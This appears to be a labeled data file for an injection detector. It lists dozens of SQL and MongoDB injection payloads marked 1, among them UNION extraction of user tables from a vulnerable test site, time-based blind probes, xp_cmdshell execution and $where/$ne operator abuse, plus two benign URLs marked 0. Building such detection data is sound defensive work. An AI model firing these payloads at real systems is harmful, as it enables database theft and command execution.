"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'",1
"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users",1
"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()",1
"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),version()",1
"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3",1
http://testphp.vulnweb.com/artists.php?artist=1,0
http://testphp.vulnweb.com,0
; --,1
'; --,1
'); --,1
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
' grant connect to name; grant resource to name; --,1
' or 1=1 --,1
' union (select @@version) --,1
' union (select NULL, (select @@version)) --,1
' union (select NULL, NULL, (select @@version)) --,1
' union (select NULL, NULL, NULL,  (select @@version)) --,1
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --,1
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --,1
'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --,1
'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --,1
'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --,1
'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --,1
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1
1'1,1
1 exec sp_ (or exec xp_),1
1 and 1=1,1
1' and 1=(select count(*) from tablenames); --,1
1 or 1=1,1
1' or '1'='1,1
1or1=1,1
1'or'1'='1,1
fake@ema'or'il.nl'='il.nl,1
1 and user_name() = 'dbo',1
\'; desc users; --,1
1\'1,1
1' and non_existant_table = '1,1
' or username is not NULL or username = ',1
1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116,1
1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --,1
1 uni/**/on select all from where,1
true, $where: '1 == 1',1
, $where: '1 == 1',1
$where: '1 == 1',1
', $where: '1 == 1',1
1, $where: '1 == 1',1
{ $ne: 1 },1
', $or: [ {}, { 'a':'a,1
' } ], $comment:'successful MongoDB injection',1
db.injection.insert({success:1});,1
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1,1
|| 1==1,1
' && this.password.match(/.*/)//+%00,1
' && this.passwordzz.match(/.*/)//+%00,1
'%20%26%26%20this.password.match(/.*/)//+%00,1
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,1
{$gt: ''},1
[$ne]=1,1
';sleep(5000);,1
';sleep(5000);',1
';sleep(5000);+',1
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
 OR 1=1,1
 OR 1=0,1
 OR x=x,1
 OR x=y,1
 OR 1=1#,1
 OR 1=0#,1
 OR x=x#,1
 OR x=y#,1
 OR 1=1-- ,1
 OR 1=0-- ,1
 OR x=x-- ,1
 OR x=y-- ,1
